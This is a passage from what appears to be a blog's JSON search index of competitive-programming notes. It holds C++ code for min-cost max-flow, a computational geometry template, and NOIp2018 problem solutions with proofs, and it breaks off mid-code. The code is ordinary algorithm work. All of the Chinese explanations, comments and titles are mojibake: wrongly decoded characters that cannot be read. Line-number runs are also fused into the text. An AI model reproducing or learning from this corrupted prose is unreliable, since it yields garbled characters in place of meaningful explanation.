int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { for (int i = 1; i &lt;= n; ++i) d[i] = inf; memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &gt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == inf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MinCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}","link":"/p/c3cdab79.html"},{"title":"ç®—æ³•ç¬”è®°-è®¡ç®—å‡ ä½•","text":"å•¥ä¹Ÿä¸è¯´äº†,ç›´æ¥ä¸Šä»£ç ,æ¯ä¸ªå‡½æ•°åŠŸèƒ½å·²ç»ä»¥æ³¨é‡Šæ–¹å¼ç»™å‡º 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453/************************************************************* * &gt; Description : è®¡ç®—å‡ ä½•æ¨¡æ¿ * &gt; Copyright (C) 2019 Tony**************************************************************/#include &lt;bits/stdc++.h&gt;using namespace std;const double eps = 1e-10; //ç²¾åº¦const double PI = acos(-1);/** * @brief ç‚¹(å‘é‡) * @param x æ¨ªåæ ‡ * @param y çºµåæ ‡ */struct Point { double x, y; Point(double x = 0, double y = 0): x(x), y(y) {}};typedef Point Vector;Vector operator + (Vector a, Vector b) { return Vector(a.x + b.x, a.y + b.y); }Vector operator - (Vector a, Vector b) { return Vector(a.x - b.x, a.y - b.y); }Vector operator * (Vector a, double p) { return Vector(a.x * p, a.y * p); }Vector operator / (Vector a, double p) { return Vector(a.x / p, a.y / p); }/** * @brief å¸¦ç²¾åº¦æ¯”è¾ƒ(ä¸‰æ€å‡½æ•°) * @param[in] x è¾“å…¥ * @return å¤§å°å…³ç³»ï¼šç­‰äº0(0), å°äºé›¶(-1), å¤§äºé›¶(1) */int dcmp(double x) { if (fabs(x) &lt; eps) return 0; else return x &lt; 0 ? -1 : 1;}bool operator &lt; (const Point&amp; a, const Point&amp; b) { return a.x &lt; b.x || (a.x == b.x &amp;&amp; a.y &lt; b.y);}bool operator == (const Point&amp; a, const Point&amp; b) { return dcmp(a.x - b.x) == 0 &amp;&amp; dcmp(a.y - b.y) == 0;}double Dot(Vector a, Vector b) { return a.x * b.x + a.y * b.y; }double Length(Vector a) { return sqrt(Dot(a, a)); }double Angle(Vector a, Vector b) { return acos(Dot(a, b) / Length(a) / Length(b)); }double Cross(Vector a, Vector b) { return a.x * b.y - a.y * b.x; }double Area2(Point a, Point b, Point c) { return Cross(b - a, c - a); }double Dist2(const Point&amp; A, const Point&amp; B) { return (A.x - B.x) * (A.x - B.x) + (A.y - B.y) * (A.y - B.y); }double angle(Vector v) { return atan2(v.y, v.x); }/** * @brief å‘é‡æ—‹è½¬ * @param[in] a å‘é‡ * @param[in] rad æ—‹è½¬è§’åº¦(é€†æ—¶é’ˆ) * @return æ—‹è½¬åçš„å‘é‡ */Vector Rotate(Vector a, double rad) { return Vector(a.x * cos(rad) - a.y * sin(rad), a.x * sin(rad) + a.y * cos(rad));}/** * @brief æ±‚å•ä½å‘é‡ * @param[in] a å‘é‡ * @return æ²¿å‘é‡açš„å•ä½å‘é‡ */Vector Normal(Vector a) { double L = Length(a); return Vector(-a.y / L, a.x / L);}/** * @brief ä¸¤æ¡ç›´çº¿äº¤ç‚¹ * @param[in] p ç¬¬ä¸€æ¡ç›´çº¿çš„èµ·å§‹ç‚¹ * @param[in] v ç¬¬ä¸€æ¡ç›´çº¿çš„æ–¹å‘å‘é‡ * @param[in] q ç¬¬äºŒæ¡ç›´çº¿çš„èµ·å§‹ç‚¹ * @param[in] w ç¬¬äºŒæ¡ç›´çº¿çš„æ–¹å‘å‘é‡ * @return ä¸¤æ¡ç›´çº¿äº¤ç‚¹ */Point GetLineIntersection(Point p, Vector v, Point q, Vector w) { Vector u = p - q; double t = Cross(w, u) / Cross(v, w); return p + v * t;}/** * @brief ç‚¹åˆ°ç›´çº¿è·ç¦» * @param[in] p ç‚¹ * @param[in] a,b ç›´çº¿ä¸Šä¸¤ç‚¹ * @return ç‚¹åˆ°ç›´çº¿è·ç¦» */double DistanceToLine(Point p, Point a, Point b) { Vector v1 = b - a, v2 = p - a; return fabs(Cross(v1, v2)) / Length(v1);}/** * @brief ç‚¹åˆ°çº¿æ®µè·ç¦» * @param[in] p ç‚¹ * @param[in] a,b çº¿æ®µä¸¤ç«¯ç‚¹ * @return ç‚¹åˆ°çº¿æ®µè·ç¦» */double DistanceToSegment(Point p, Point a, Point b) { if (a == b) return Length(p - a); Vector v1 = b - a, v2 = p - a, v3 = p - b; if (dcmp(Dot(v1, v2)) &lt; 0) return Length(v2); else if (dcmp(Dot(v1, v3)) &gt; 0) return Length(v3); else return fabs(Cross(v1, v2)) / Length(v1);}/** * @brief ç‚¹åœ¨ç›´çº¿ä¸ŠæŠ•å½±ç‚¹ * @param[in] p ç‚¹ * @param[in] a,b ç›´çº¿ä¸Šä¸¤ç‚¹ * @return ç‚¹åœ¨ç›´çº¿ä¸ŠæŠ•å½±ç‚¹ */Point GetLineProjection(Point p, Point a, Point b) { Vector v = b - a; return a + v * (Dot(v, p - a) / Dot(v, v));}/** * @brief çº¿æ®µç›¸äº¤åˆ¤å®š(ä¸å«ç«¯ç‚¹) * @param[in] a1,a2 ç¬¬ä¸€æ¡çº¿æ®µç«¯ç‚¹ * @param[in] b1,b2 ç¬¬äºŒæ¡çº¿æ®µç«¯ç‚¹ * @return æ˜¯å¦ç›¸äº¤(bool) */bool SegmentProperIntersection(Point a1, Point a2, Point b1, Point b2) { double c1 = Cross(a2 - a1, b1 - a1), c2 = Cross(a2 - a1, b2 - a1), c3 = Cross(b2 - b1, a1 - b1), c4 = Cross(b2 - b1, a2 - b1); return dcmp(c1) * dcmp(c2) &lt; 0 &amp;&amp; dcmp(c3) * dcmp(c4) &lt; 0;}/** * @brief ç‚¹åœ¨çº¿æ®µä¸Šåˆ¤å®š(ä¸åŒ…æ‹¬ç«¯ç‚¹) * @param[in] p ç‚¹ * @param[in] a1,a2 çº¿æ®µä¸¤ç«¯ç‚¹ * @return æ˜¯å¦åœ¨çº¿æ®µä¸Š(bool) */bool OnSegment(Point p, Point a1, Point a2) { return dcmp(Cross(a1 - p, a2 - p)) == 0 &amp;&amp; dcmp(Dot(a1 - p, a2 - p)) &lt; 0;}/** * @brief å¤šè¾¹å½¢é¢ç§¯ * @param[in] *p é¡¶ç‚¹æ•°ç»„ * @param[in] * @return */double PolygonArea(Point* p, int n) { double area = 0; for (int i = 1; i &lt; n - 1; ++i) { area += Cross(p[i] - p[0], p[i + 1] - p[0]); } return area / 2;}/** * @brief ç›´çº¿(å‚æ•°å¼) * @param p ç›´çº¿ä¸Šçš„ä¸€ç‚¹ * @param v æ–¹å‘å‘é‡ * @param ang æ–¹å‘å‘é‡æè§’ * @function point(double t) * @brief ç›´çº¿ä¸Šçš„ç‚¹ * @param[in] t æ¨ªåæ ‡ * @return ç›´çº¿ä¸Šçš„ç‚¹ * @function move(double d) * @brief æ²¿ç›´çº¿ç§»åŠ¨ * @param[in] d å¹³ç§»è·ç¦» * @return å¹³ç§»åçš„ç›´çº¿ */struct Line { Point p; Vector v; double ang; Line() {} Line(Point p, Vector v): p(p), v(v) { ang = atan2(v.y, v.x); } bool operator &lt; (const Line&amp; L) const { return ang &lt; L.ang; } Point point(double t) { return p + v * t; } Line move(double d) { return Line(p + Normal(v) * d, v); }};/** * @brief æ˜¯å¦åœ¨ç›´çº¿å·¦ä¾§ * @param[in] L ç›´çº¿ * @param[in] p ç‚¹ * @return æ˜¯å¦åœ¨ç‚¹å·¦ä¾§(bool) */bool OnLeft(Line L, Point p) { return Cross(L.v, p - L.p) &gt; 0;}/** * @brief ä¸¤æ¡ç›´çº¿äº¤ç‚¹(é‡è½½) * @param[in] a ç¬¬ä¸€æ¡ç›´çº¿ * @param[in] b ç¬¬äºŒæ¡ç›´çº¿ * @return ä¸¤æ¡ç›´çº¿äº¤ç‚¹ */Point GetLineIntersection(Line a, Line b) { Vector u = a.p - b.p; double t = Cross(b.v, u) / Cross(a.v, b.v); return a.p + a.v * t;}/** * @brief åœ† * @param c åœ†å¿ƒ * @param r åŠå¾„ * @function point(double a) * @brief åœ†ä¸Šçš„ç‚¹ * @param[in] a æ¨ªåæ ‡ * @return åœ†ä¸Šçš„ç‚¹ */struct Circle { Point c; double r; Circle(Point c, double r): c(c), r(r) {} Point point(double a) { return Point(c.x + cos(a) * r, c.y + sin(a) * r); }};/** * @brief ç›´çº¿å’Œåœ†äº¤ç‚¹ * @param[in] L ç›´çº¿ * @param[in] C åœ† * @param[out] t1,t2 äº¤ç‚¹æ¨ªåæ ‡ * @param[out] sol äº¤ç‚¹é›†(vector) * @return äº¤ç‚¹ä¸ªæ•° */int GetLineCircleIntersection(Line L, Circle C, double&amp; t1, double&amp; t2, vector&lt;Point&gt;&amp; sol) { double a = L.v.x, b = L.p.x - C.c.x, c = L.v.y, d = L.p.y - C.c.y; double e = a * a + c * c, f = 2 * (a * b + c * d), g = b * b + d * d - C.r * C.r; double delta = f * f - 4 * e * g; if (dcmp(delta) &lt; 0 ) return 0; if (dcmp(delta) == 0) { t1 = t2 = -f / (2 * e); sol.push_back(L.point(t1)); return 1; } t1 = (-f - sqrt(delta)) / (2 * e); sol.push_back(L.point(t1)); t2 = (-f + sqrt(delta)) / (2 * e); sol.push_back(L.point(t2)); return 2;}/** * @brief åœ†å’Œåœ†äº¤ç‚¹ * @param[in] C1,C2 ä¸¤åœ† * @param[out] sol äº¤ç‚¹é›†(vector) * @return äº¤ç‚¹ä¸ªæ•° */int GetCircleCircleIntersection(Circle C1, Circle C2, vector&lt;Point&gt;&amp; sol) { double d = Length(C1.c - C2.c); if (dcmp(d) == 0) { if (dcmp(C1.r - C2.r) == 0) return -1; return 0; } if (dcmp(C1.r + C2.r - d) &lt; 0) return 0; if (dcmp(fabs(C1.r - C2.r) - d) &gt; 0) return 0; double a = angle(C2.c - C1.c); double da = acos((C1.r * C1.r + d * d - C2.r * C2.r) / (2 * C1.r * d)); Point p1 = C1.point(a - da), p2 = C1.point(a + da); sol.push_back(p1); if (p1 == p2) return 1; sol.push_back(p2); return 2;}/** * @brief æ±‚åˆ‡çº¿ * @param[in] p ç‚¹ * @param[in] C åœ† * @param[out] *v åˆ‡çº¿ * @return åˆ‡çº¿æ¡æ•° */int getTangents(Point p, Circle C, Vector* v) { Vector u = C.c - p; double dist = Length(u); if (dist &lt; C.r) return 0; else if (dcmp(dist - C.r) == 0) { v[0] = Rotate(u, PI / 2); return 1; } else { double ang = asin(C.r / dist); v[0] = Rotate(u, -ang); v[1] = Rotate(u, +ang); return 2; }}/** * @brief ä¸¤åœ†å…¬åˆ‡çº¿ * @param[in] A,B ä¸¤åœ† * @param[out] *a,*b åˆ‡ç‚¹ * @return å…¬åˆ‡çº¿æ¡æ•° */int getTangents(Circle A, Circle B, Point* a, Point* b) { int cnt = 0; if (A.r - B.r) { swap(A, B); swap(a, b); } int d2 = (A.c.x - B.c.x) * (A.c.x - B.c.x) + (A.c.y - B.c.y) * (A.c.y - B.c.y); int rdiff = A.r - B.r; int rsum = A.r + B.r; if (d2 &lt; rdiff * rdiff) return 0; double base = atan2(B.c.y - A.c.y, B.c.x - A.c.x); if (d2 == 0 &amp;&amp; A.r == B.r) return -1; if (d2 == rdiff * rdiff) { a[cnt] = A.point(base); b[cnt] = B.point(base); cnt++; return 1; } double ang = acos((A.r - B.r) / sqrt(d2)); a[cnt] = A.point(base + ang); b[cnt] = B.point(base + ang); cnt++; a[cnt] = A.point(base - ang); b[cnt] = B.point(base - ang); cnt++; if (d2 == rsum * rsum) { a[cnt] = A.point(base); b[cnt] = B.point(PI + base); cnt++; } else if (d2 &gt; rsum * rsum) { double ang = acos((A.r + B.r) / sqrt(d2)); a[cnt] = A.point(base + ang); b[cnt] = B.point(PI + base + ang); cnt++; a[cnt] = A.point(base - ang); b[cnt] = B.point(PI + base - ang); cnt++; } return cnt;}typedef vector&lt;Point&gt; Polygon;/** * @brief åˆ¤å®šç‚¹åœ¨å¤šè¾¹å½¢å†… * @param[in] p ç‚¹ * @param[in] poly å¤šè¾¹å½¢ * @return æ˜¯å¦åœ¨å¤šè¾¹å½¢å†…(åœ¨1,ä¸åœ¨0,åœ¨è¾¹ä¸Š-1) */int isPointInPolygon(Point p, Polygon poly) { int wn = 0; int n = poly.size(); for (int i = 0; i &lt; n; ++i) { if (OnSegment(p, poly[i], poly[(i + 1) % n])) return -1; int k = dcmp(Cross(poly[(i + 1) % n] - poly[i], p - poly[i])); int d1 = dcmp(poly[i].y - p.y); int d2 = dcmp(poly[(i + 1) % n].y - p.y); if (k &gt; 0 &amp;&amp; d1 &lt;= 0 &amp;&amp; d2 &gt; 0) wn++; if (k &lt; 0 &amp;&amp; d2 &lt;= 0 &amp;&amp; d1 &gt; 0) wn--; } if (wn != 0) return 1; return 0;}/** * @brief å‡¸åŒ… * @param[in] p ç‚¹é›† * @return å‡¸åŒ…å¤šè¾¹å½¢ */Polygon ConvexHull(vector&lt;Point&gt; p) { sort(p.begin(), p.end()); p.erase(unique(p.begin(), p.end()), p.end()); int n = p.size(); int m = 0; Polygon ch(n + 1); for (int i = 0; i &lt; n; ++i) { while (m &gt; 1 &amp;&amp; Cross(ch[m - 1] - ch[m - 2], p[i] - ch[m - 2]) &lt;= 0) m--; ch[m++] = p[i]; } int k = m; for (int i = n - 2; i &gt;= 0; --i) { while (m &gt; k &amp;&amp; Cross(ch[m - 1] - ch[m - 2], p[i] - ch[m - 2]) &lt;= 0) m--; ch[m++] = p[i]; } if (n &gt; 1) m--; ch.resize(m); return ch;}/** * @brief æ—‹è½¬å¡å£³ * @param[in] points ç‚¹é›† * @return ç›´å¾„ */int diameter2(vector&lt;Point&gt;&amp; points) { //æ—‹è½¬å¡å£³ vector&lt;Point&gt; p = ConvexHull(points); int n = p.size(); if (n == 1) return 0; if (n == 2) return Dist2(p[0], p[1]); p.push_back(p[0]); int ans = 0; for (int u = 0, v = 1; u &lt; n; ++u) { for(;;) { int diff = Cross(p[u + 1] - p[u], p[v + 1] - p[v]); if (diff &lt;= 0) { ans = max(ans, (int)Dist2(p[u], p[v])); if (diff == 0) ans = max(ans, (int)Dist2(p[u], p[v + 1])); break; } v = (v + 1) % n; } } return ans;}/** * @brief åˆ‡å¤šè¾¹å½¢ * @param[in] poly å¤šè¾¹å½¢ * @param[in] A,B ç›´çº¿ä¸Šä¸¤ç‚¹ * @return æ–°å¤šè¾¹å½¢ */Polygon CutPolygon(Polygon poly, Point A, Point B) { Polygon newpoly; int n = poly.size(); for (int i = 0; i &lt; n; ++i) { Point C = poly[i]; Point D = poly[(i + 1) % n]; if (dcmp(Cross(B - A, C - A)) &gt;= 0) newpoly.push_back(C); if (dcmp(Cross(B - A, C - D)) != 0) { Point ip = GetLineIntersection(A, B - A, C, D - C); if (OnSegment(ip, C, D)) newpoly.push_back(ip); } } return newpoly;}/** * @brief åŠå¹³é¢äº¤ * @param[in] L ç›´çº¿é›† * @return å¤šè¾¹å½¢ */vector&lt;Point&gt; HalfplaneIntersection(vector&lt;Line&gt; L) { int n = L.size(); sort(L.begin(), L.end()); int first, last; vector&lt;Point&gt; p(n); vector&lt;Line&gt; q(n); vector&lt;Point&gt; ans; q[first = last = 0] = L[0]; for (int i = 1; i &lt; n; i++) { while (first &lt; last &amp;&amp; !OnLeft(L[i], p[last - 1])) last--; while (first &lt; last &amp;&amp; !OnLeft(L[i], p[first])) first++; q[++last] = L[i]; if (fabs(Cross(q[last].v, q[last - 1].v)) &lt; eps) { last--; if (OnLeft(q[last], L[i].p)) q[last] = L[i]; } if (first &lt; last) p[last - 1] = GetLineIntersection(q[last - 1], q[last]); } while (first &lt; last &amp;&amp; !OnLeft(q[first], p[last - 1])) last--; if (last - first &lt;= 1) return ans; p[last] = GetLineIntersection(q[last], q[first]); for (int i = first; i &lt;= last; i++) ans.push_back(p[i]); return ans;}","link":"/p/1aba30fe.html"},{"title":"ã€ŒNOIp2018ã€é¢˜è§£","text":"emmmï¼Œä»Šå¤©å¼€å§‹ä»2018å‘å‰åšNOIpçš„çœŸé¢˜ï¼Œå¹¶å†™ä¸€äº›é¢˜è§£ï¼Œå¤ªè’»äº†Orz $D1T1$ é“ºè®¾é“è·¯å—¯ï½13å¹´åŸé¢˜ï¼Œ__è´ªå¿ƒAC__ é¢˜è§£å¯¹åŒºé—´è¿›è¡Œâ€œå¡«å‘â€è´ªå¿ƒç­–ç•¥ï¼š 1if (d[i] &gt; d[i - 1]) ans += d[i] - d[i - 1]; $proof:$ å‡è®¾ç°åœ¨æœ‰ä¸€ä¸ªå‘ï¼Œæ—è¾¹è¿˜æœ‰ä¸€ä¸ªå‘ã€‚ é‚£è‚¯å®šä¼šåŒæ—¶å¡«ä¸Šä¸¤ä¸ªå‘ï¼Œæ‰€ä»¥__å°çš„å‘ä¼šè¢«å¤§çš„å‘å¸¦ç€å¡«ä¸Š__ï¼ŒåŠ__å°å‘å…è´¹ï¼Œå¤§å‘å‡å°‘a[i] - a[i - 1]__$Q.E.D$ç»“æœè¿˜è¦åŠ ä¸Ša[1] ä»£ç 12345678910111213141516171819202122#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 100010;int n, d[maxn];long long ans;int main() { scanf(&quot;%d&quot;, &amp;n); for (int i = 1; i &lt;= n; ++i) { scanf(&quot;%d&quot;, &amp;d[i]); } for (int i = 2; i &lt;= n; ++i) { if (d[i] &gt; d[i - 1]) { ans += d[i] - d[i - 1]; } } printf(&quot;%lld&quot;, ans + d[1]); return 0;}/* 41ms 1220kB */ $D1T2$ è´§å¸ç³»ç»Ÿè¡¨é¢ä¸Šæ˜¯æ•°è®ºï¼Œå…¶å®å°±æ˜¯ä¸ª__åŠ¨æ€è§„åˆ’__ é¢˜è§£é¦–å…ˆè®¾$A = (n, a) \\ \\ B = (m, b)$å¯ä»¥è¯æ˜$B \\subseteq A$$proof:$ æˆ‘ä»¬è®¾$x\\in A$ä¸”$x$ä¸èƒ½è¢«$A$é›†åˆå†…é™¤å®ƒä»¥å¤–çš„å…ƒç´ ç»„æˆã€‚ ç„¶åæˆ‘ä»¬å‡è®¾$x \\notin B$ï¼Œé‚£ä¹ˆå°±è¯´æ˜$B$é›†åˆä¸­å¿…ç„¶å­˜åœ¨ä¸€äº›å…ƒç´ èƒ½å¤Ÿç»„æˆ$x$ã€‚ é‚£ä¹ˆè¿™äº›å…ƒç´ è‡³å°‘å­˜åœ¨ä¸€ä¸ªä¸åœ¨é›†åˆ$A$å†…å¹¶ä¸”ä¸èƒ½è¢«é›†åˆ$A$é‡Œçš„å…ƒç´ ç»„æˆçš„æ•°ï¼ˆå› ä¸ºå¦‚æœä¸å­˜åœ¨çš„è¯é›†åˆ$A$å†…çš„å…ƒç´ å°±å¯ä»¥ç»„æˆ$x$äº†ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸é›†åˆ$B$çš„å®šä¹‰äº§ç”Ÿäº†çŸ›ç›¾ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œ$A$é›†åˆå†…ä¸èƒ½è¢«å…¶å®ƒæ•°ç»„æˆçš„æ•°å¿…ç„¶å­˜åœ¨äº$B$é›†åˆå†…$Q.E.D$ ç„¶ååŠ¨æ€è§„åˆ’dp[i]è¡¨ç¤º$i$é¢å€¼æœ€å¤šèƒ½è¢«å‡ å¼ é’±è¡¨ç¤ºåˆ™è‹¥å…¶ä¸èƒ½è¢«è¡¨ç¤ºdp[i] = -infèƒ½è¡¨ç¤ºä¸”åªæœ‰å®ƒè‡ªå·±åˆ™dp[i] = 1åˆå§‹åŒ–dp[] = -inf; dp[0] = 0çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸ºdp[j] = max(dp[j], dp[j - a[i]] + 1) ä»£ç 123456789101112131415161718192021222324252627282930#include &lt;bits/stdc++.h&gt;using namespace std;int n, T, ans, a[1010], dp[30010];int main() { scanf(&quot;%d&quot;, &amp;T); while (T--) { memset(dp, -0x3f, sizeof(dp)); memset(a, 0, sizeof(a)); ans = 0; dp[0] = 0; scanf(&quot;%d&quot;, &amp;n); for (int i = 1; i &lt;= n; ++i) { scanf(&quot;%d&quot;, &amp;a[i]); } for (int i = 1; i &lt;= n; ++i) { for (int j = a[i]; j &lt;= 25010; ++j) { dp[j] = max(dp[j], dp[j - a[i]] + 1); } } for (int i = 1; i &lt;= n; ++i) { if (dp[a[i]] == 1) { ans++; } } printf(&quot;%d\\n&quot;, ans); } return 0;}/* 862ms 944kB */ $D1T3$ èµ›é“ä¿®å»ºè¿™é¢˜æ¯”è¾ƒå¤æ‚ï¼Œå…ˆå¾—éƒ¨åˆ†åˆ† $I.$ $m = 1$ æ—¶æœ€ç®€å•çš„æƒ…å†µæ±‚ä¸€æ¡æœ€é•¿é“¾ï¼Œå³æ±‚æ ‘çš„ç›´å¾„ï¼ˆè®°å½•ä¸€ä¸‹æœ€å¤§å€¼å’Œæ¬¡å¤§å€¼ï¼Œæ¯æ¬¡æŠŠæœ€å¤§å€¼ä¼ åˆ°å®ƒçš„çˆ¶äº²ï¼‰å¯ä»¥é€šè¿‡ç¬¬$1,4,5,6$ä¸ªç‚¹ï¼Œ$20$åˆ† ä»£ç 12345678910111213141516171819namespace Meq1 { int dfs(int now, int fa) { int res1 = 0, res2 = 0; for (int i = head[now]; i; i = edges[i].nxt) { int to = edges[i].to; if (to == fa) continue; res2 = max(res2, dfs(to, now) + edges[i].val); if (res2 &gt; res1) swap(res1, res2); } ans = max(ans, res1 + res2); return res1; } void solve() { dfs(1, 0); printf(&quot;%d\\n&quot;, ans); return ; }} $II.$ $a_i = 1$ æ—¶å³ä¸€ä¸ªèŠèŠ±å›¾æŠŠæ‰€æœ‰è¾¹æƒè®°å½•ä¸‹æ¥ï¼Œä»å¤§åˆ°å°æ’åºã€‚è®¾è¾¹æƒä¸º$w$ï¼Œç­”æ¡ˆå³ä¸º$w_1+w_{2m-1},w_2+w_{2m-2},â€¦,w_m+w_{m+1}$çš„æœ€å°å€¼å¯ä»¥é€šè¿‡$1,5,7,8$å››ä¸ªç‚¹ï¼Œ$20$åˆ†ï¼ŒåŠ ä¸Š$m = 1$çš„æƒ…å†µå…±$35$åˆ† ä»£ç 123456789101112131415161718192021namespace Aeq1 { int arr[maxn]; bool cmp(int a, int b) { return a &gt; b; } void solve() { for (int i = head[1]; i; i = edges[i].nxt) { int to = edges[i].to; arr[to - 1] = edges[i].val; } sort(arr + 1, arr + n, cmp); ans = inf; for (int i = 1; i &lt;= m; ++i) { ans = min(ans, arr[i] + arr[2 * m - i + 1]); } printf(&quot;%d\\n&quot;, ans); return ; }} $III.$ $b_i = a_i + 1$ æ—¶ä¸ºä¸€æ¡é“¾æŠŠæ‰€æœ‰è¾¹æƒè®°å½•ä¸‹æ¥ï¼Œè¿™ç§æƒ…å†µç­‰ä»·äºå°†åºåˆ—åˆ†å‰²æˆ$m$æ®µï¼Œä½¿$m$æ®µåŒºé—´å’Œçš„æœ€å°å€¼æœ€å¤§é‚£ä¹ˆäºŒåˆ†$m$æ®µåŒºé—´å’Œçš„æœ€å°å€¼ï¼Œç„¶åè´ªå¿ƒæ‰«ä¸€éå¯ä»¥é€šè¿‡$2,9,10,11$å››ä¸ªç‚¹ï¼Œ$20$åˆ†ï¼ŒåŠ ä¸Šä¸€å…±$55$åˆ† ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950namespace BeqApl1 { int arr[maxn], ans; int Dfs(int now, int fa) { int res1 = 0, res2 = 0; for (int i = head[now]; i; i = edges[i].nxt) { int to = edges[i].to; if (to == fa) continue; res2 = max(res2, Dfs(to, now) + edges[i].val); if (res2 &gt; res1) swap(res1, res2); } ans = max(ans, res1 + res2); return res1; } void dfs(int now, int fa) { for (int i = head[now]; i; i = edges[i].nxt) { int to = edges[i].to; if (to == fa) continue; dfs(to, now); arr[now] = edges[i].val; } } bool judge(int x) { int t = 0, now = 0; for (int i = 1; i &lt; n; ++i) { if (now + arr[i] &gt;= x) { now = 0; t++; } else { now += arr[i]; } } return t &gt;= m; } void solve() { dfs(1, 0); Dfs(1, 0); int l = 1, r = ans, mid; while (l &lt; r) { mid = l + r + 1 &gt;&gt; 1; if (judge(mid)) l = mid; else r = mid - 1; } printf(&quot;%d\\n&quot;, l); return ; }} æ­£è§£æœ€å°å€¼æœ€å¤§ï¼Œæ˜¾ç„¶æ˜¯äºŒåˆ†è¿™ä¸ªæœ€å°å€¼$lim$å¯¹äºä¸€ä¸ªèŠ‚ç‚¹$u$ï¼Œæˆ‘ä»¬å¯ä»¥è®°å½•ä¸€ä¸ªè¿æ¥åˆ°$u$çš„èµ›é“çš„é•¿åº¦$val_i$ï¼Œé‚£ä¹ˆå¯ä»¥åˆ†æˆä¸¤ç§æƒ…å†µè¿›è¡Œè®¨è®ºï¼š$$\\begin{cases} val_i+dis \\geq lim \\text{ç›´æ¥ç»™ç­”æ¡ˆ+1} \\\\ val_i+dis&lt; lim \\text{åˆ©ç”¨ä¼˜å…ˆé˜Ÿåˆ—ç»´æŠ¤}\\end{cases}$$ ä»£ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;bits/stdc++.h&gt;using namespace std;void read(int&amp; x) { x = 0; char ch = getchar(); while (ch &lt; '0' || ch &gt; '9') ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') {x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + ch - 48; ch = getchar();}}const int maxn = 50050;const int inf = 0x3f3f3f3f;int n, m, cnt, num, s[maxn], mid;struct Edge { int from, to, val; Edge(int u, int v, int w) : from(u), to(v), val(w) {}};vector&lt;Edge&gt; G[maxn];void add(int u, int v, int w) { G[u].push_back(Edge(u, v, w)); G[v].push_back(Edge(v, u, w));}int dfs(int u, int fa) { priority_queue&lt;int&gt; lh; priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt; sh; int ln = 0, sn = 1; for (int i = 0; i &lt; G[u].size(); ++i) { if (G[u][i].to != fa) { int d = G[u][i].val + dfs(G[u][i].to, u); sh.push(d); lh.push(d); ln++; } } while (ln &gt; 0 &amp;&amp; lh.top() &gt;= mid) {num++; lh.pop(); ln--;} int now = 0; while (ln &gt; sn) { if (u != 1 &amp;&amp; lh.top() + sh.top() &gt;= mid) { int cnt = 0; while (ln &gt; sn &amp;&amp; lh.top() + sh.top() &gt;= mid) {s[++cnt] = lh.top(); lh.pop(); ln--;} num++; sh.pop(); sn++; while (cnt &gt; 1) {lh.push(s[--cnt]); ln++;} } else if (u == 1 &amp;&amp; lh.top() + sh.top() &gt;= mid) { lh.pop(); sh.pop(); ln--; sn++; num++; } else { now = sh.top(); sh.pop(); sn++; } if (num &gt;= m) break; } if (ln &gt;= sn &amp;&amp; !lh.empty()) return lh.top(); else return now;}bool check() { num = 0; dfs(1, 0); if (num &gt;= m) return true; else return false;}int main() { read(n); read(m); int all = 0; for (int i = 1; i &lt; n; ++i) { int u, v, w; read(u); read(v); read(w); add(u, v, w); all += w; } int l = 0, r = all / m, ans = 0; while (l &lt;= r) { mid = (l + r) &gt;&gt; 1; if (check()) { l = mid + 1; ans = mid; } else { r = mid - 1; } } printf(&quot;%d\\n&quot;, ans); return 0;}/* 1050ms 11964kB with O2 */ $D2T1$ æ—…è¡Œåˆ†ä¸¤ç§æƒ…å†µè®¨è®º $I.$ $m = n - 1$å³æ— ç¯ï¼Œåªè¦ç»™ä¸€ä¸ªç‚¹æ‰€èƒ½åˆ°è¾¾çš„ç‚¹çš„ç¼–å·è¿›è¡Œä¸€æ¬¡ä»å°åˆ°å¤§çš„æ’åºï¼Œåœ¨æ ‘ä¸Šdfsä¸€éå³å¯è§£å†³æ ·ä¾‹1å›¾ç¤ºï¼š ä»£ç 123456789101112131415161718192021222324namespace SolveOne { int cnt = 0; bool vis[maxn]; void dfs(int u, int fa) { ans[++cnt] = u; vis[u] = true; for (int i = 0; i &lt; G[u].size(); 